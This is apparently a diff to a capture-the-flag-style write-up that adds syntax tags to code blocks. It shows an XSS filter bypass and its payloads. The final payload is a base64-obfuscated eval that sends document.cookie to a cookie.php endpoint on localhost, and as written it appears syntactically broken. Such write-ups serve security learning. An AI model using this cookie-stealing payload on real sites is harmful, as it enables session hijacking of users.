@@ -35,7 +35,7 @@ and the page returned
 
 so obviously there is some kinds of filtering, the next step is to find out how the page is filtering my message, I checked around and found out "script.js", which has the following code:
 
-```
+```javascript
 (async () => {
     await new Promise((resolve) => {
         window.addEventListener('load', resolve);
@@ -72,13 +72,13 @@ the clean function is what filters out my message, and there is a flaw in it. No
 
 Then I tried to test my payload:
 
-```
+```html
 ><img src="x" onerror="alert(1);">
 ```
 
 which works like a charm. Next let's do some more dangerous payload, to make sure everything works I used the eval() function, which takes in a string and evaluate the string as JS code. Here is my finaly payload:
 
-```
+```html
 ><img src="x" onerror="eval(atob(bmV3IEltYWdlKCkuc3JjPWh0dHA6Ly9sb2NhbGhvc3QvY29va2llLnBocD9jPStkb2N1bWVudC5jb29raWU7Cg==))">
 ```
 
